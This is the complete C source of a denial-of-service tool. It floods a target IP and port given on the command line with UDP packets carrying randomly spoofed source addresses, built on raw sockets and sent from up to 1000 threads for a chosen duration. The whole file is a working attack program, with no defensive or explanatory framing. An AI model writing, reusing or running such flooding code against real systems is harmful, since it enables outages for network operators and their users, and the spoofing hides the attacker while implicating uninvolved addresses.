#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>

#define MAX_PACKET_SIZE 1472
#define THREAD_LIMIT 1000

volatile sig_atomic_t attack_running = 1;

void handle_interrupt(int sig) {
    attack_running = 0;
}

// UDP pseudo header for checksum
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

// Compute checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Real-time monitor
void *monitor_speed(void *arg) {
    unsigned long *counter = (unsigned long *)arg;
    unsigned long last = 0;

    while (attack_running) {
        sleep(1);
        unsigned long current = *counter;
        printf("[+] Packets/sec: %lu | Total: %lu\n", current - last, current);
        last = current;
    }

    return NULL;
}

// Thread argument
typedef struct {
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    unsigned long packet_count;
} ThreadArgs;

void *udp_flood_spoofed(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Raw socket failed");
        pthread_exit(NULL);
    }

    // Enable IP_HDRINCL so we can build our own IP headers
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("IP_HDRINCL failed");
        close(sockfd);
        pthread_exit(NULL);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(args->target_port);
    dest.sin_addr.s_addr = inet_addr(args->target_ip);

    char packet[MAX_PACKET_SIZE];
    srand(time(NULL) ^ pthread_self());

    while (attack_running) {
        memset(packet, 0, MAX_PACKET_SIZE);

        // IP header
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
        char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        int data_len = 32;
        for (int i = 0; i < data_len; i++)
            data[i] = rand() % 256;

        // Random source IP
        uint32_t spoofed_ip = (rand() % 256) << 24 | (rand() % 256) << 16 |
                              (rand() % 256) << 8 | (rand() % 256);

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = spoofed_ip;
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

        // UDP header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(args->target_port);
        udph->len = htons(sizeof(struct udphdr) + data_len);
        udph->check = 0;

        // Pseudo header for UDP checksum
        struct pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.udp_length = htons(sizeof(struct udphdr) + data_len);

        int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + data_len;
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + data_len);

        udph->check = checksum((unsigned short *)pseudogram, psize);
        free(pseudogram);

        sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len,
               0, (struct sockaddr *)&dest, sizeof(dest));

        args->packet_count++;
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <TARGET_IP> <PORT> <TIME_SEC> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads > THREAD_LIMIT) {
        printf("Too many threads, limiting to %d.\n", THREAD_LIMIT);
        threads = THREAD_LIMIT;
    }

    signal(SIGINT, handle_interrupt);

    pthread_t *tids = malloc(threads * sizeof(pthread_t));
    ThreadArgs *args = malloc(threads * sizeof(ThreadArgs));
    pthread_t monitor;

    // Shared packet counter
    unsigned long total_packets = 0;

    // Launch threads
    for (int i = 0; i < threads; i++) {
        strncpy(args[i].target_ip, target_ip, INET_ADDRSTRLEN);
        args[i].target_port = target_port;
        args[i].packet_count = 0;
        pthread_create(&tids[i], NULL, udp_flood_spoofed, &args[i]);
    }

    // Monitor thread
    pthread_create(&monitor, NULL, monitor_speed, &total_packets);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
        total_packets += args[i].packet_count;
    }

    pthread_join(monitor, NULL);

    printf("[+] Attack completed.\n");
    printf("[+] Total packets sent: %lu\n", total_packets);

    free(tids);
    free(args);
    return EXIT_SUCCESS;
}
